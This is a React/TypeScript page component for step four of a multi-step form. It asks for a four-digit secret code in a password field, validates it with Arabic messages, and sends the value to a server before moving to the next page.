import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import { currentPage, sendDataToServer } from "../../context/signals";

function Page4() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    sendDataToServer(data, "page4", "page5", true);
  }

  useEffect(() => {
    currentPage.value = "page4";
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col flex-1 gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <Input
          errors={errors}
          register={register}
          id="code"
          label="رمز"
          type="password"
          isAr
          options={{
            required: "this field is required",
            pattern: {
              value: /^[0-9]{4}$/,
              message: "يجب كتابة رمز مكون من أربعة ارقام",
            },
          }}
        />

        <div className="flex items-end flex-1">
          <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
        </div>
      </form>
    </Main>
  );
}

export default Page4;
